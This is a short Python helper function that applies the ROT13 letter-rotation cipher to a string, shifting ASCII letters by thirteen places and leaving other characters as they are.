def _rot13(s: str) -> str:
    return "".join(
        chr((ord(c) - 65 + 13) % 26 + 65) if "A" <= c <= "Z" else
        chr((ord(c) - 97 + 13) % 26 + 97) if "a" <= c <= "z" else c
        for c in s
    )


